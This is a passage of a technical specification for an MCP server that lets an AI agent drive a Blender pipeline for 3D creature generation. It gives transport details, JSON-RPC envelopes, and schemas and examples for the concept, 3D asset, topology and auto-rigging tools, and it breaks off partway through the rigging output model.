# MorphoMesh: Model Context Protocol (MCP) Server Specification

**Document ID**: `MM-R3-SPEC-001`  
**Milestone**: M3 (MCP Server Specification & Architecture Roadmap)  
**Author**: MorphoMesh Core Protocol & Architecture Team  
**Date**: September 2026  
**Status**: Authoritative Protocol Specification / Publication-Grade Standard  
**Protocol Version**: Model Context Protocol (MCP) 2024-11-05 / FastMCP 1.28.1  
**Target Environments**: Google Antigravity 2.0, Python 3.11+, Pydantic v2.13+, Blender 5.2.1 LTS (macOS Apple Silicon & Linux x86_64)  
**Repository Path**: `docs/MCP_SPECIFICATION.md`  

---

## Table of Contents

1. [Executive Summary & Architectural Scope](#1-executive-summary--architectural-scope)
2. [Protocol Architecture & Transport Layer](#2-protocol-architecture--transport-layer)
   - [2.1 FastMCP 1.28.1 SDK Architecture](#21-fastmcp-1281-sdk-architecture)
   - [2.2 Standard I/O (`stdio`) Transport](#22-standard-io-stdio-transport)
   - [2.3 Server-Sent Events (`sse`) Remote Transport](#23-server-sent-events-sse-remote-transport)
   - [2.4 JSON-RPC 2.0 Message Framing & Envelope Specification](#24-json-rpc-20-message-framing--envelope-specification)
   - [2.5 Asynchronous Lifecycle & Progress Streaming (`Context`)](#25-asynchronous-lifecycle--progress-streaming-context)
3. [Comprehensive Specification of the 7 Core MCP Tools](#3-comprehensive-specification-of-the-7-core-mcp-tools)
   - [3.1 `morphomesh_generate_concept`](#31-morphomesh_generate_concept)
   - [3.2 `morphomesh_create_3d_asset`](#32-morphomesh_create_3d_asset)
   - [3.3 `morphomesh_optimize_topology`](#33-morphomesh_optimize_topology)
   - [3.4 `morphomesh_auto_rig`](#34-morphomesh_auto_rig)
   - [3.5 `morphomesh_blender_execute`](#35-morphomesh_blender_execute)
   - [3.6 `morphomesh_get_scene_status`](#36-morphomesh_get_scene_status)
   - [3.7 `morphomesh_render_preview`](#37-morphomesh_render_preview)
4. [Global Error Taxonomy & Protocol Mapping](#4-global-error-taxonomy--protocol-mapping)
   - [4.1 Authoritative Error Code Matrix](#41-authoritative-error-code-matrix)
   - [4.2 JSON-RPC, HTTP, and FastMCP Exception Mapping](#42-json-rpc-http-and-fastmcp-exception-mapping)
   - [4.3 Fault Recovery & Circuit Breaker Logic](#43-fault-recovery--circuit-breaker-logic)
5. [Security Architecture & Sandboxing](#5-security-architecture--sandboxing)
   - [5.1 Threat Model for Autonomous DCC Agents](#51-threat-model-for-autonomous-dcc-agents)
   - [5.2 Two-Tier Security Architecture](#52-two-tier-security-architecture)
   - [5.3 AST Static Analysis Engine (`BpyCodeValidator`)](#53-ast-static-analysis-engine-bpycodevalidator)
   - [5.4 Execution Timeouts & OS Process Isolation](#54-execution-timeouts--os-process-isolation)
6. [Client Integration & Verification Guide](#6-client-integration--verification-guide)
   - [6.1 Google Antigravity 2.0 Configuration](#61-google-antigravity-20-configuration)
   - [6.2 Python Async Client Conformance Harness](#62-python-async-client-conformance-harness)
   - [6.3 Schema Conformance Testing Protocol](#63-schema-conformance-testing-protocol)

---

## 1. Executive Summary & Architectural Scope

The **MorphoMesh Model Context Protocol (MCP) Server** defines the authoritative communication boundary between **Google Antigravity 2.0** (autonomous multi-agent AI orchestrator) and **Blender 5.2.1 LTS** (digital content creation engine). Purpose-built for high-fidelity 3D creature and animal generation, the server coordinates a multi-stage procedural and neural synthesis pipeline:

$$\text{User Prompt} \xrightarrow{\text{Stage 1}} \text{Concept Image} \xrightarrow{\text{Stage 2}} \text{3D Mesh \& PBR} \xrightarrow{\text{Stage 3}} \text{Retopology} \xrightarrow{\text{Stage 4}} \text{Biomechanical Rig} \xrightarrow{\text{Stage 5}} \text{Scene \& Render}$$

The server is built atop the official **FastMCP Python SDK** (`mcp` 1.28.1) running in Python 3.11+. It exposes exactly **seven atomic, deterministic, and idempotent tools** designed to eliminate hallucinations, enforce parameter validity through Pydantic v2 schemas, isolate execution environments with static Abstract Syntax Tree (AST) validation, and stream rich visual artifacts (multipart `ImageContent` and `TextContent`) directly back to the autonomous agent.

```
┌─────────────────────────────────────────────────────────────────────────────────────────┐
│                                   MORPHOMESH MCP BOUNDARY                               │
└─────────────────────────────────────────────────────────────────────────────────────────┘
   Google Antigravity 2.0 (Agent Host)
              │
              │ JSON-RPC 2.0 (stdio or SSE Transport)
              ▼
┌─────────────────────────────────────────────────────────────────────────────────────────┐
│ FastMCP 1.28.1 Server (src/morphomesh/server.py)                                        │
│  ├── Pydantic v2 Schema Validator & Parameter Unpacker                                  │
│  ├── Context Lifecycle Manager (Progress Streaming, Logging, Cancellation)             │
│  ├── AST Static Security Guard (BpyCodeValidator)                                       │
│  └── Dual Adapter Dispatcher (InferenceAdapter & BlenderBridge)                         │
└─────────────────────────────────────────────────────────────────────────────────────────┘
              │                                      │
              ▼ (IPC / HTTPS)                        ▼ (Localhost TCP / Headless Subprocess)
┌───────────────────────────────┐      ┌──────────────────────────────────────────────────┐
│ AI Inference Tier             │      │ Blender 5.2.1 LTS Environment                    │
│ • Mock Adapter (Offline/CI)   │      │ • Headless CLI Runner (blender -b -P)            │
│ • Remote Cloud GPU (TRELLIS)  │      │ • Interactive Addon Socket (127.0.0.1:9876)      │
│ • Local Rembg / CoreML        │      │ • EEVEE Next Render Engine & Rigify Rigging      │
└───────────────────────────────┘      └──────────────────────────────────────────────────┘
```

---

## 2. Protocol Architecture & Transport Layer

### 2.1 FastMCP 1.28.1 SDK Architecture

MorphoMesh standardizes on `from mcp.server.fastmcp import FastMCP, Image, Context`. FastMCP provides an ergonomic, high-performance abstraction over the low-level Model Context Protocol primitives.

```python
# src/morphomesh/server.py
from mcp.server.fastmcp import FastMCP

mcp = FastMCP(
    name="MorphoMeshServer",
    instructions=(
        "Authoritative 3D creature generation pipeline and Blender bridge. "
        "Coordinates prompt engineering, image-to-3D diffusion, quad retopology, "
        "biomechanical auto-rigging, scene assembly, and EEVEE Next turntable rendering."
    ),
    host="127.0.0.1",
    port=8765
)
```

#### Parameter Unpacking Discipline
To guarantee maximum compatibility with Anthropic Claude, Google Gemini, and OpenAI function calling engines in Antigravity 2.0, all tools must expose **top-level JSON properties** in their `inputSchema`. FastMCP extracts individual keyword arguments into top-level JSON Schema properties:

```python
# CORRECT: Exposes flat properties { "prompt": ..., "creature_type": ... }
@mcp.tool(name="morphomesh_generate_concept")
async def generate_concept(
    prompt: str,
    creature_type: str = "custom",
    view_mode: str = "front",
    **kwargs
) -> dict: ...

# INCORRECT: Produces nested payload { "payload": { "prompt": ... } }
@mcp.tool(name="morphomesh_generate_concept")
async def generate_concept(payload: GenerateConceptInput) -> dict: ...
```
Internal logic validates inputs against strongly typed Pydantic v2 models (`GenerateConceptInput(**kwargs)`).

---

### 2.2 Standard I/O (`stdio`) Transport

The primary transport for local agent orchestration on macOS (Apple Silicon) is **Standard I/O (`stdio`)**. Antigravity 2.0 launches MorphoMesh as a managed child process:

```
[ Antigravity 2.0 ] ─── stdin (JSON-RPC) ───► [ MorphoMesh FastMCP Server ]
[ Antigravity 2.0 ] ◄── stdout (JSON-RPC) ─── [ MorphoMesh FastMCP Server ]
```

#### Operational Rules for `stdio` Transport:
1. **Purity of `stdout`**: `stdout` is reserved exclusively for framed JSON-RPC 2.0 messages. Any unauthorized writes (e.g. `print()`, third-party library banner logs, or C++ driver warnings) corrupt the stream and trigger protocol termination.
2. **Diagnostic Redirection**: All diagnostic logging, telemetry, and debugging info must be directed to `sys.stderr` or emitted via `ctx.info()` / `ctx.warning()`.
3. **Encoding**: All communications are strictly UTF-8 encoded with standard newline (`\n` or `\r\n`) delimiters.

---

### 2.3 Server-Sent Events (`sse`) Remote Transport

For multi-machine setups, continuous integration (CI) test runners, and remote GPU container instances, MorphoMesh supports the HTTP Server-Sent Events (`sse`) transport:

```
Client (Antigravity) ─── HTTP GET /sse ────────────► FastMCP SSE Endpoint (Port 8765)
Client (Antigravity) ◄── text/event-stream ───────── FastMCP SSE Stream
Client (Antigravity) ─── HTTP POST /messages?id=... ► FastMCP Command Handler
```

- **Session Handshake**: The client connects to `GET /sse`. The server responds with an SSE event containing the unique session URI (e.g. `/messages?sessionId=7f9c2d1b`).
- **Heartbeats**: The server sends periodic comment pings (`: ping\n\n`) every 15 seconds to prevent NAT gateway timeouts.
- **TLS Termination**: When deployed over public networks, SSE must be terminated behind a reverse proxy (e.g. NGINX or Caddy) enforcing TLS 1.3.

---

### 2.4 JSON-RPC 2.0 Message Framing & Envelope Specification

All communications adhere strictly to the JSON-RPC 2.0 specification over the MCP wire.

#### Standard Tool Call Request Envelope
```json
{
  "jsonrpc": "2.0",
  "id": "call-001-4f8a-92b1",
  "method": "tools/call",
  "params": {
    "name": "morphomesh_optimize_topology",
    "arguments": {
      "asset_id": "a91b2c3d-88f1-47ea-9c02-45e0d192a831",
      "target_poly_count": 8000,
      "topology_type": "quad_dominant",
      "preserve_uvs": true,
      "method": "quadriflow"
    }
  }
}
```

#### Standard Tool Success Response Envelope
```json
{
  "jsonrpc": "2.0",
  "id": "call-001-4f8a-92b1",
  "result": {
    "content": [
      {
        "type": "text",
        "text": "{\n  \"optimized_asset_id\": \"opt-e83c21a0-4b21-46bb-b31a-637dc49d1052\",\n  \"output_mesh_path\": \"/Users/duongnad/Documents/tool/MorphoMesh/.cache/assets/opt_e83c21a0.glb\",\n  \"original_vertex_count\": 48250,\n  \"original_face_count\": 96400,\n  \"optimized_vertex_count\": 8120,\n  \"optimized_face_count\": 7980,\n  \"quad_percentage\": 94.6,\n  \"reduction_ratio\": 0.0827,\n  \"uv_preserved\": true,\n  \"processing_time_seconds\": 2.15\n}"
      }
    ],
    "isError": false
  }
}
```

#### Multipart Success Response Envelope (`ImageContent` + `TextContent`)
For rendering and visual inspection tools, MorphoMesh returns binary image data alongside structured metadata:
```json
{
  "jsonrpc": "2.0",
  "id": "call-002-8c4e-11d2",
  "result": {
    "content": [
      {
        "type": "image",
        "data": "iVBORw0KGgoAAAANSUhEUgAABAAAAAQACAYAAABW9ybpAAAABHNCSVQICAgIfAhkiAAAAAlwSFlz...",
        "mimeType": "image/png"
      },
      {
        "type": "text",
        "text": "{\n  \"image_path\": \"/Users/duongnad/Documents/tool/MorphoMesh/.cache/renders/preview_front.png\",\n  \"resolution\": [1024, 1024],\n  \"render_engine\": \"BLENDER_EEVEE\",\n  \"samples\": 64,\n  \"render_time_seconds\": 0.84\n}"
      }
    ],
    "isError": false
  }
}
```

#### Standard Tool Error Response Envelope
```json
{
  "jsonrpc": "2.0",
  "id": "call-003-99ab-33ef",
  "result": {
    "content": [
      {
        "type": "text",
        "text": "MorphoMesh Tool Error: [ERR_SCRIPT_SECURITY_VIOLATION] Forbidden import detected: 'os' on line 1."
      }
    ],
    "isError": true
  }
}
```

---

### 2.5 Asynchronous Lifecycle & Progress Streaming (`Context`)

Tools executing long-running computational steps (3D diffusion, QuadriFlow remeshing, rigging, rendering) inject the FastMCP `Context` parameter:

```python
from mcp.server.fastmcp import Context

@mcp.tool(name="morphomesh_create_3d_asset")
async def create_3d_asset(
    image_path: str | None = None,
    concept_id: str | None = None,
    model_backend: str = "mock",
    ctx: Context = None
) -> dict:
    if ctx:
        await ctx.info("Initializing 3D generative pipeline...")
        await ctx.report_progress(progress=10, total=100)
    ...
```

1. **Progress Reporting**: Translates to `notifications/progress` frames containing `progress`, `total`, and `progressToken`.
2. **Diagnostic Logs**: Calls to `ctx.info()`, `ctx.warning()`, and `ctx.error()` emit `notifications/message` frames at corresponding log levels (`info`, `warning`, `error`).
3. **Client Cancellation**: FastMCP monitors client cancellation tokens. If the agent cancels an execution, the server propagates `asyncio.CancelledError` through the active task, terminating background workers and subprocesses.

---

## 3. Comprehensive Specification of the 7 Core MCP Tools

### 3.1 `morphomesh_generate_concept`

#### 3.1.1 Role in Creature Pipeline
Serves as **Stage 1 (Prompt Engineering & Concept Synthesis)**. Takes an unstructured natural language description, expands it with standardized anatomical priors (symmetrical posture, planar limb alignment, neutral lighting, alpha-isolated solid backdrop), and generates a 2D concept image ready for single-view 3D reconstruction.

#### 3.1.2 Parameter Table
| Parameter | Type | Required | Default | Validation Bounds / Enums | Description |
|---|---|---|---|---|---|
| `prompt` | `string` | **Yes** | — | Min 3 chars, max 2000 chars | Natural language description of creature anatomy, species, features. |
| `negative_prompt` | `string` | No | `""` | Max 1000 chars | Negative constraints (e.g. "blurry, cropped, human, text, watermark"). |
| `creature_type` | `string` | No | `"custom"` | `quadruped`, `biped`, `winged`, `aquatic`, `serpentine`, `hybrid`, `custom` | Morphological archetype guiding anatomical prompt engineering. |
| `view_mode` | `string` | No | `"front"` | `front`, `side`, `three_quarter`, `turnaround_sheet`, `orthographic_front_side` | Perspective tailored for 3D reconstruction. |
| `pose` | `string` | No | `"standing_neutral"` | `neutral_t_pose`, `neutral_a_pose`, `standing_neutral`, `relaxed` | Rest pose preventing limb self-occlusion. |
| `style` | `string` | No | `"realistic"` | `realistic`, `stylized`, `dark_fantasy`, `sci_fi`, `cartoon`, `sculpture` | Visual rendering aesthetic. |
| `background` | `string` | No | `"white_neutral"` | `white_neutral`, `black_neutral`, `gray_neutral`, `transparent` | Solid neutral backdrop ensuring clean foreground segmentation. |
| `width` | `integer`| No | `1024` | `512` to `2048`, step 64 | Image width in pixels. |
| `height` | `integer`| No | `1024` | `512` to `2048`, step 64 | Image height in pixels. |
| `seed` | `integer`| No | `-1` | `-1` to `2147483647` | Deterministic random seed (-1 for randomized generation). |
| `output_format` | `string` | No | `"png"` | `png`, `webp`, `jpeg` | File format for cached image. |

#### 3.1.3 JSON Schema (Draft-07 / Pydantic v2)
```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "title": "morphomesh_generate_concept_input",
  "type": "object",
  "properties": {
    "prompt": {
      "type": "string",
      "minLength": 3,
      "maxLength": 2000,
      "description": "Natural language description of creature anatomy, species, features."
    },
    "negative_prompt": {
      "type": "string",
      "maxLength": 1000,
      "default": "",
      "description": "Negative constraints to avoid artifacts, cropping, or occlusions."
    },
    "creature_type": {
      "type": "string",
      "enum": ["quadruped", "biped", "winged", "aquatic", "serpentine", "hybrid", "custom"],
      "default": "custom",
      "description": "Morphological archetype guiding prompt augmentation."
    },
    "view_mode": {
      "type": "string",
      "enum": ["front", "side", "three_quarter", "turnaround_sheet", "orthographic_front_side"],
      "default": "front",
      "description": "Camera perspective tailored for 3D reconstruction."
    },
    "pose": {
      "type": "string",
      "enum": ["neutral_t_pose", "neutral_a_pose", "standing_neutral", "relaxed"],
      "default": "standing_neutral",
      "description": "Rest pose preventing limb self-occlusion."
    },
    "style": {
      "type": "string",
      "enum": ["realistic", "stylized", "dark_fantasy", "sci_fi", "cartoon", "sculpture"],
      "default": "realistic",
      "description": "Visual rendering aesthetic."
    },
    "background": {
      "type": "string",
      "enum": ["white_neutral", "black_neutral", "gray_neutral", "transparent"],
      "default": "white_neutral",
      "description": "Neutral backdrop ensuring clean segmentation."
    },
    "width": {
      "type": "integer",
      "minimum": 512,
      "maximum": 2048,
      "default": 1024,
      "description": "Image width in pixels (multiple of 64)."
    },
    "height": {
      "type": "integer",
      "minimum": 512,
      "maximum": 2048,
      "default": 1024,
      "description": "Image height in pixels (multiple of 64)."
    },
    "seed": {
      "type": "integer",
      "minimum": -1,
      "maximum": 2147483647,
      "default": -1,
      "description": "RNG seed (-1 for random)."
    },
    "output_format": {
      "type": "string",
      "enum": ["png", "webp", "jpeg"],
      "default": "png",
      "description": "File format on disk."
    }
  },
  "required": ["prompt"],
  "additionalProperties": false
}
```

#### 3.1.4 Output Schema & Pydantic v2 Models
```python
from typing import Literal, Optional, Dict, Any, List
from pydantic import BaseModel, Field, field_validator

class GenerateConceptInput(BaseModel):
    prompt: str = Field(..., min_length=3, max_length=2000)
    negative_prompt: str = Field(default="", max_length=1000)
    creature_type: Literal["quadruped", "biped", "winged", "aquatic", "serpentine", "hybrid", "custom"] = "custom"
    view_mode: Literal["front", "side", "three_quarter", "turnaround_sheet", "orthographic_front_side"] = "front"
    pose: Literal["neutral_t_pose", "neutral_a_pose", "standing_neutral", "relaxed"] = "standing_neutral"
    style: Literal["realistic", "stylized", "dark_fantasy", "sci_fi", "cartoon", "sculpture"] = "realistic"
    background: Literal["white_neutral", "black_neutral", "gray_neutral", "transparent"] = "white_neutral"
    width: int = Field(default=1024, ge=512, le=2048)
    height: int = Field(default=1024, ge=512, le=2048)
    seed: int = Field(default=-1, ge=-1, le=2147483647)
    output_format: Literal["png", "webp", "jpeg"] = "png"

    @field_validator("width", "height")
    @classmethod
    def validate_dimension_step(cls, v: int) -> int:
        if v % 64 != 0:
            return round(v / 64) * 64
        return v

class GenerateConceptOutput(BaseModel):
    concept_id: str = Field(..., description="Unique concept UUID")
    image_path: str = Field(..., description="Absolute path to cached image")
    prompt_enhanced: str = Field(..., description="Augmented prompt with anatomical modifiers")
    creature_type: str
    view_mode: str
    dimensions: List[int]
    seed_used: int
    status: Literal["success", "mock_success"]
```

#### 3.1.5 Error Codes
- `ERR_INVALID_ARGUMENT`: Empty prompt, whitespace-only, or out-of-bounds dimensions.
- `ERR_INFERENCE_FAILED`: 2D generative diffusion endpoint returned non-200, invalid tensor, or timed out.
- `ERR_DISK_WRITE_FAILED`: Server unable to write concept image to cache storage directory.

#### 3.1.6 Example Request & Response
**Request:**
```json
{
  "prompt": "Armored direwolf with crystalline spine plates and dual curled horns, full body",
  "creature_type": "quadruped",
  "view_mode": "three_quarter",
  "pose": "standing_neutral",
  "style": "dark_fantasy",
  "background": "white_neutral",
  "width": 1024,
  "height": 1024,
  "seed": 10842
}
```
**Response:**
```json
{
  "concept_id": "c7a84e29-3f01-44ab-b56e-821e25e9821a",
  "image_path": "/Users/duongnad/Documents/tool/MorphoMesh/.cache/concepts/c7a84e29-3f01-44ab-b56e-821e25e9821a.png",
  "prompt_enhanced": "Armored direwolf with crystalline spine plates and dual curled horns, full body, symmetrical quadruped anatomy, standing neutral pose, studio lighting, neutral solid white background, high geometric fidelity, 8k render",
  "creature_type": "quadruped",
  "view_mode": "three_quarter",
  "dimensions": [1024, 1024],
  "seed_used": 10842,
  "status": "success"
}
```

---

### 3.2 `morphomesh_create_3d_asset`

#### 3.2.1 Role in Creature Pipeline
Serves as **Stage 2 (Single-Image to 3D Generation)**. Consumes a 2D concept image, strips background elements if present, feeds the alpha-masked creature silhouette into a 3D generative model (TRELLIS.2 4B, Hunyuan3D-2.1, or deterministic Mock adapter), and generates a dense 3D mesh packed with complete PBR texture maps (Albedo, Normal, Roughness, Metallic) in standard `.glb` format.

#### 3.2.2 Parameter Table
| Parameter | Type | Required | Default | Validation Bounds / Enums | Description |
|---|---|---|---|---|---|
| `image_path` | `string` | Cond. | `null` | Existing file path | Direct file path to concept image. (Required if `concept_id` omitted). |
| `concept_id` | `string` | Cond. | `null` | Valid UUID | Concept identifier from Stage 1. |
| `model_backend` | `string` | No | `"mock"` | `mock`, `trellis`, `hunyuan3d_2`, `step1x_3d`, `triposr` | 3D reconstruction engine backend. |
| `export_format` | `string` | No | `"glb"` | `glb`, `obj`, `fbx`, `ply` | Output 3D container format. |
| `generate_pbr` | `boolean`| No | `true` | `true`, `false` | Synthesize and bake PBR texture maps. |
| `texture_resolution`| `integer`| No| `2048` | `512`, `1024`, `2048`, `4096` | Texture atlas square dimension. |
| `remove_background`| `boolean`| No| `true` | `true`, `false` | Run automated rembg segmentation. |
| `guidance_scale` | `number` | No | `7.5` | `1.0` to `20.0` | Classifier-free guidance strength. |
| `seed` | `integer`| No | `-1` | `-1` to `2147483647` | Random seed for generative 3D sampling. |

#### 3.2.3 JSON Schema (Draft-07 / Pydantic v2)
```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "title": "morphomesh_create_3d_asset_input",
  "type": "object",
  "properties": {
    "image_path": {
      "type": "string",
      "description": "Path to local concept image on disk."
    },
    "concept_id": {
      "type": "string",
      "description": "UUID of concept generated in Stage 1."
    },
    "model_backend": {
      "type": "string",
      "enum": ["mock", "trellis", "hunyuan3d_2", "step1x_3d", "triposr"],
      "default": "mock",
      "description": "3D AI generator engine."
    },
    "export_format": {
      "type": "string",
      "enum": ["glb", "obj", "fbx", "ply"],
      "default": "glb",
      "description": "Target 3D file format."
    },
    "generate_pbr": {
      "type": "boolean",
      "default": true,
      "description": "Bake PBR textures (albedo, roughness, metallic, normal)."
    },
    "texture_resolution": {
      "type": "integer",
      "enum": [512, 1024, 2048, 4096],
      "default": 2048,
      "description": "Texture atlas resolution in pixels."
    },
    "remove_background": {
      "type": "boolean",
      "default": true,
      "description": "Perform foreground isolation before 3D reconstruction."
    },
    "guidance_scale": {
      "type": "number",
      "minimum": 1.0,
      "maximum": 20.0,
      "default": 7.5,
      "description": "Classifier-free guidance strength."
    },
    "seed": {
      "type": "integer",
      "minimum": -1,
      "default": -1,
      "description": "RNG seed (-1 for random)."
    }
  },
  "additionalProperties": false
}
```

#### 3.2.4 Output Schema & Pydantic v2 Models
```python
class BoundingBox(BaseModel):
    min_point: List[float] = Field(..., description="[min_x, min_y, min_z]")
    max_point: List[float] = Field(..., description="[max_x, max_y, max_z]")
    dimensions: List[float] = Field(..., description="[width, depth, height]")

class Create3DAssetOutput(BaseModel):
    asset_id: str = Field(..., description="Unique 3D asset UUID")
    mesh_path: str = Field(..., description="Path to generated .glb/.obj file")
    format: str
    vertex_count: int
    face_count: int
    has_pbr_materials: bool
    texture_paths: Dict[str, str] = Field(default_factory=dict)
    bounding_box: BoundingBox
    generation_time_seconds: float
    backend_used: str
```

#### 3.2.5 Error Codes
- `ERR_IMAGE_NOT_FOUND`: Neither `image_path` nor `concept_id` provided, or target file missing.
- `ERR_BACKEND_UNAVAILABLE`: Selected remote GPU backend unreachable, unauthenticated, or offline.
- `ERR_INFERENCE_FAILED`: 3D diffusion failed to extract isosurface or produced 0 polygons.
- `ERR_VRAM_EXHAUSTED`: GPU Out of Memory on remote node.

#### 3.2.6 Example Request & Response
**Request:**
```json
{
  "concept_id": "c7a84e29-3f01-44ab-b56e-821e25e9821a",
  "model_backend": "mock",
  "export_format": "glb",
  "generate_pbr": true,
  "texture_resolution": 2048
}
```
**Response:**
```json
{
  "asset_id": "a91b2c3d-88f1-47ea-9c02-45e0d192a831",
  "mesh_path": "/Users/duongnad/Documents/tool/MorphoMesh/.cache/assets/a91b2c3d-88f1-47ea-9c02-45e0d192a831.glb",
  "format": "glb",
  "vertex_count": 48250,
  "face_count": 96400,
  "has_pbr_materials": true,
  "texture_paths": {
    "albedo": "/Users/duongnad/Documents/tool/MorphoMesh/.cache/assets/a91b2c3d_albedo.png",
    "roughness": "/Users/duongnad/Documents/tool/MorphoMesh/.cache/assets/a91b2c3d_roughness.png",
    "metallic": "/Users/duongnad/Documents/tool/MorphoMesh/.cache/assets/a91b2c3d_metallic.png",
    "normal": "/Users/duongnad/Documents/tool/MorphoMesh/.cache/assets/a91b2c3d_normal.png"
  },
  "bounding_box": {
    "min_point": [-1.2, -0.8, 0.0],
    "max_point": [1.2, 0.8, 1.95],
    "dimensions": [2.4, 1.6, 1.95]
  },
  "generation_time_seconds": 1.42,
  "backend_used": "mock"
}
```

---

### 3.3 `morphomesh_optimize_topology`

#### 3.3.1 Role in Creature Pipeline
Serves as **Stage 3 (Topology Optimization & Retopology)**. Dense raw meshes from AI generators (150,000–450,000 irregular triangles) cannot deform cleanly without artifacting. This tool retopologizes the geometry into a clean quad-dominant structure conforming to a user-specified polycount budget, preserving anatomical edge creases, sharp features (claws, horns), and UV parameterization.

#### 3.3.2 Parameter Table
| Parameter | Type | Required | Default | Validation Bounds / Enums | Description |
|---|---|---|---|---|---|
| `asset_id` | `string` | Cond. | `null` | Valid UUID | Asset ID from Stage 2. |
| `input_mesh_path` | `string` | Cond. | `null` | Existing file path | Direct file path to 3D mesh. (Required if `asset_id` omitted). |
| `target_poly_count`| `integer`| No | `10000` | `500` to `500000` | Desired polygon (face) budget. |
| `topology_type` | `string` | No | `"quad_dominant"` | `quad_dominant`, `pure_quad`, `triangulated`, `adaptive` | Geometric element preference. |
| `preserve_uvs` | `boolean`| No | `true` | `true`, `false` | Transfer or re-project existing UV maps. |
| `preserve_sharp_edges`| `boolean`| No| `true` | `true`, `false` | Maintain high-frequency anatomical creases. |
| `method` | `string` | No | `"quadriflow"` | `quadriflow`, `decimate`, `voxel_remesh`, `meshanything_v2`, `mock` | Retopology solver algorithm. |
| `output_format` | `string` | No | `"glb"` | `glb`, `obj`, `fbx` | Output mesh container format. |

#### 3.3.3 JSON Schema (Draft-07 / Pydantic v2)
```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "title": "morphomesh_optimize_topology_input",
  "type": "object",
  "properties": {
    "asset_id": { "type": "string", "description": "Asset UUID from Stage 2." },
    "input_mesh_path": { "type": "string", "description": "Direct file path to 3D mesh." },
    "target_poly_count": {
      "type": "integer",
      "minimum": 500,
      "maximum": 500000,
      "default": 10000,
      "description": "Desired polygon (face) count."
    },
    "topology_type": {
      "type": "string",
      "enum": ["quad_dominant", "pure_quad", "triangulated", "adaptive"],
      "default": "quad_dominant",
      "description": "Preferred polygon topology."
    },
    "preserve_uvs": { "type": "boolean", "default": true, "description": "Preserve UV coordinates." },
    "preserve_sharp_edges": { "type": "boolean", "default": true, "description": "Preserve creased feature edges." },
    "method": {
      "type": "string",
      "enum": ["quadriflow", "decimate", "voxel_remesh", "meshanything_v2", "mock"],
      "default": "quadriflow",
      "description": "Retopology solver algorithm."
    },
    "output_format": {
      "type": "string",
      "enum": ["glb", "obj", "fbx"],
      "default": "glb",
      "description": "Target file format."
    }
  },
  "additionalProperties": false
}
```

#### 3.3.4 Output Schema & Pydantic v2 Models
```python
class OptimizeTopologyOutput(BaseModel):
    optimized_asset_id: str
    output_mesh_path: str
    original_vertex_count: int
    original_face_count: int
    optimized_vertex_count: int
    optimized_face_count: int
    quad_percentage: float = Field(..., ge=0.0, le=100.0)
    reduction_ratio: float
    uv_preserved: bool
    processing_time_seconds: float
```

#### 3.3.5 Error Codes
- `ERR_INPUT_MESH_NOT_FOUND`: Target mesh file missing from disk.
- `ERR_INVALID_POLY_COUNT`: Requested face count outside allowed range [500, 500,000].
- `ERR_NON_MANIFOLD_MESH`: Mesh contains degenerate topology that solver cannot resolve.
- `ERR_REMESH_FAILED`: Retopology solver encountered internal divergence or timeout.

#### 3.3.6 Example Request & Response
**Request:**
```json
{
  "asset_id": "a91b2c3d-88f1-47ea-9c02-45e0d192a831",
  "target_poly_count": 8000,
  "topology_type": "quad_dominant",
  "method": "quadriflow"
}
```
**Response:**
```json
{
  "optimized_asset_id": "opt-e83c21a0-4b21-46bb-b31a-637dc49d1052",
  "output_mesh_path": "/Users/duongnad/Documents/tool/MorphoMesh/.cache/assets/opt_e83c21a0.glb",
  "original_vertex_count": 48250,
  "original_face_count": 96400,
  "optimized_vertex_count": 8120,
  "optimized_face_count": 7980,
  "quad_percentage": 94.6,
  "reduction_ratio": 0.0827,
  "uv_preserved": true,
  "processing_time_seconds": 2.15
}
```

---

### 3.4 `morphomesh_auto_rig`

#### 3.4.1 Role in Creature Pipeline
Serves as **Stage 4 (Biomechanical Skeleton & Auto-Rigging)**. Analyzes 3D creature geometry, locates anatomical landmarks (head, pelvis, spine joints, limb chains, wings, tail), constructs a modular armature compatible with Blender Rigify, calculates automatic skin deformation weights, and binds standard test animation actions.

#### 3.4.2 Parameter Table
| Parameter | Type | Required | Default | Validation Bounds / Enums | Description |
|---|---|---|---|---|---|
| `asset_id` | `string` | Cond. | `null` | Valid UUID | Asset ID from Stage 2 or 3. |
| `input_mesh_path` | `string` | Cond. | `null` | Existing file path | Direct file path to mesh. (Required if `asset_id` omitted). |
| `creature_type` | `string` | No | `"quadruped"` | `quadruped`, `biped`, `winged_quadruped`, `serpentine`, `bird`, `spider_arthropod`, `fish_aquatic`, `custom_auto` | Anatomical morphology guiding bone placement. |
| `rig_type` | `string` | No | `"rigify_creature"`| `basic_fk`, `rigify_creature`, `game_engine_root`, `deform_only` | Armature control structure. |
| `skinning_method` | `string` | No | `"automatic_weights"`| `automatic_weights`, `voxel_heat_diffuse`, `geodesic_voxel` | Vertex weighting algorithm. |
| `symmetry` | `boolean`| No | `true` | `true`, `false` | Enforce bilateral X-axis symmetry. |
| `generate_test_animation`| `boolean`| No| `true` | `true`, `false` | Attach an idle walk or pose action. |
| `load_into_scene` | `boolean`| No | `true` | `true`, `false` | Import character into active Blender scene. |

#### 3.4.3 JSON Schema (Draft-07 / Pydantic v2)
```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "title": "morphomesh_auto_rig_input",
  "type": "object",
  "properties": {
    "asset_id": { "type": "string", "description": "Asset UUID to rig." },
    "input_mesh_path": { "type": "string", "description": "Direct path to mesh file." },
    "creature_type": {
      "type": "string",
      "enum": ["quadruped", "biped", "winged_quadruped", "serpentine", "bird", "spider_arthropod", "fish_aquatic", "custom_auto"],
      "default": "quadruped",
      "description": "Morphological archetype guiding metarig selection."
    },
    "rig_type": {
      "type": "string",
      "enum": ["basic_fk", "rigify_creature", "game_engine_root", "deform_only"],
      "default": "rigify_creature",
      "description": "Armature control hierarchy."
    },
    "skinning_method": {
      "type": "string",
      "enum": ["automatic_weights", "voxel_heat_diffuse", "geodesic_voxel"],
      "default": "automatic_weights",
      "description": "Vertex skin weighting algorithm."
    },
    "symmetry": { "type": "boolean", "default": true, "description": "Enforce X bilateral symmetry." },
    "generate_test_animation": { "type": "boolean", "default": true, "description": "Attach test animation action." },
    "load_into_scene": { "type": "boolean", "default": true, "description": "Import into active Blender scene." }
  },
  "additionalProperties": false
}
```

#### 3.4.4 Output Schema & Pydantic v2 Models
```python
class AutoRigOutput(BaseModel):
    rigged_asset_id: str
    blend_file_path: Optional[str]
    exported_mesh_path: str
    armature_name: str
    bone_count: int
